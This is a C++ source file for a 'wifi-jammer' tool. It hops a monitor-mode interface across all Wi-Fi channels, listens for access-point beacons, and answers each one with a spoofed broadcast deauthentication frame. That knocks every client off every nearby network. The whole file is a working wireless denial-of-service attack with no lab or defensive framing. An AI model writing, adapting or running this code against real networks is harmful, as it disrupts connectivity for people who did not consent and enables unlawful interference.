#include "stdafx.h"
#include "dot11.h"
#include <iwlib.h>

#define DEAUTHPACKET_LEN 0x26 //38byte
#define AUTHPACKET_LEN 0x36 //54byte

struct DeauthAttackPacket
{
    Dot11RadioTapHdr radiohdr_; //8bytes
    u_int8_t datarate_; //1bytes
    u_int8_t pad_; //1bytes
    u_int16_t txflags_; //2bytes
    Dot11BeaconFrame beaconhdr_; //24bytes
    u_int16_t fixedparam_; //2bytes
};

int channelChange(int sock, char* interface, iwrange range) {
    struct iwreq wrq;
    int len = 0;

    if (iw_get_range_info(sock, interface, &range) < 0) {
        printf("Error during iw_get_range_info. Aborting.\n");
        exit(2);
    }
    for(int i = 0;i<IW_MAX_FREQUENCIES;i++) {
        if(range.freq[i].m == 0) {
            len = IW_MAX_FREQUENCIES;
            if(i != 0)
                len = i;
            break;
        }
    }
    printf("channel list length: %d\n", len);

    while(true) {
        for(int i = 0;i<len;i++) {
            usleep(1000000);

            memset(&wrq, 0, sizeof(struct iwreq));
            wrq.u.freq.m = range.freq[i].m; //freq
            wrq.u.freq.e = range.freq[i].e;
            wrq.u.freq.i = range.freq[i].i;
            wrq.u.freq.flags = range.freq[i].flags;

            iw_set_ext(sock, interface, SIOCSIWFREQ, &wrq);
            iw_get_ext(sock, interface, SIOCSIWFREQ, &wrq);

            double freq = iw_freq2float(&(range.freq[i]));
            int channel = iw_freq_to_channel(freq, &range);
            printf("change channel: %d\n", channel);
            printf("change freq: %d\n", wrq.u.freq.m);
        }
    }
}

void usage() {
	printf("syntax : wifi-jammer <interface>\n");
	printf("sample : wifi-jammer mon0\n");
}

int main(int argc, char* argv[]) {
    int res;
    iwrange range;
    double start, end;

	if (argc < 2) {
        usage();
        return -1;
    }

    char* interface = argv[1];
    std::cout << "selected interface: "<< interface << std::endl;

    int sock = iw_sockets_open();
    if (iw_get_range_info(sock, interface, &range) < 0) {
        printf("Error during iw_get_range_info. Aborting.\n");
        exit(2);
    }

	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf); //1000
	if (handle == NULL) {
		std::cerr << "pcap_open_live(" << interface << ") return null - " << errbuf << std::endl;
		return -1;
	}

    Dot11RadioTapHdr hdr;
    BeaconPacketForm pk;

    std::thread thd(channelChange, sock, interface, range);
    thd.detach();

    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cout << "pcap_next_ex return " << res << "(" << pcap_geterr(handle) << ")" << std::endl;
            break;
        }
        memcpy(&hdr, packet, RADIOTAPHDR_LEN);
        memcpy(&pk, packet+hdr.len_, DOT11BEACONFRAME_LEN + DOT11WIRELESSMANFIXED_LEN);
        pk.taggedp_.setting(packet + hdr.len_ + DOT11BEACONFRAME_LEN + DOT11WIRELESSMANFIXED_LEN, header->caplen);
        if(pk.dot11bf_.checkBeaconType()) {
            DeauthAttackPacket attackpk;
            attackpk.radiohdr_.revision_ = 0x00;
            attackpk.radiohdr_.pad_ = 0x00;
            attackpk.radiohdr_.len_ = 0x000c;
            attackpk.radiohdr_.presentflag_ = 0x00000000;
            attackpk.datarate_ = 0x02;
            attackpk.pad_ = 0x00;
            attackpk.txflags_ = 0x0018;
            attackpk.beaconhdr_.framecontrol_ = 0xc0;
            attackpk.beaconhdr_.flags_ = 0x00;
            attackpk.beaconhdr_.duration_ = 0x0000;
            attackpk.beaconhdr_.addr1_ = Mac("ff:ff:ff:ff:ff:ff");
            attackpk.beaconhdr_.addr2_ = pk.dot11bf_.addr2_;
            attackpk.beaconhdr_.addr3_ = pk.dot11bf_.addr3_;
            attackpk.beaconhdr_.fragseqnum_ = 0x0000;
            attackpk.fixedparam_ = 0x0007;
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attackpk), DEAUTHPACKET_LEN);
            printf("Deauth packet send channel: \n");
        }
    }
	pcap_close(handle);
    iw_sockets_close(sock);
}
